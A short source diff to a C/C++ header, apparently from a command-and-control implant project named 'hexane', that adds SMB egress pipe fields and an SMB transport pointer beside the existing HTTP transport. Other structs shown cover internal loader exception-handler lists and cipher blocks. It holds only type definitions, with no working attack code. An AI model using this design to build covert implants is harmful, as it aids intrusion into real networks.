@@ -320,6 +320,8 @@ struct _smb_context {
 	DWORD 			peer_id;
 	LPWSTR 			ingress_name;
 	HANDLE 			ingress_handle;
+	LPWSTR 			egress_name;
+	HANDLE 			egress_handle;
 	_smb_context 	*next;
 };
 
@@ -351,8 +353,6 @@ struct _token_list_data {
 	_token_list_data* Next;
 };
 
-
-
 struct _parser {
 	LPVOID 	handle;
     LPVOID  buffer;
@@ -376,7 +376,6 @@ struct _command_map{
 	_command 	address;
 };
 
-
 struct LdrpVectorHandlerEntry {
     LdrpVectorHandlerEntry 		*flink;
     LdrpVectorHandlerEntry 		*blink;
@@ -385,25 +384,21 @@ struct LdrpVectorHandlerEntry {
     PVECTORED_EXCEPTION_HANDLER handler;
 };
 
-
 struct LdrpVectorHandlerList {
     LdrpVectorHandlerEntry *first;
     LdrpVectorHandlerEntry *last;
     SRWLOCK 				lock;
 };
 
-
 struct _heap_info {
     ULONG_PTR heap_id;
     DWORD pid;
 };
 
-
 struct _u32_block {
     uint32_t v0;
     uint32_t v1;
 };
-
 
 struct _ciphertext {
     uint32_t table[64];
@@ -481,6 +476,7 @@ struct _hexane{
 		SIZE_T	    	env_proxylen;
 		LPSTR 			domain;
 		_http_context 	*http;
+		_smb_context	*smb;
         _stream        	*outbound_queue;
 	} transport;
 
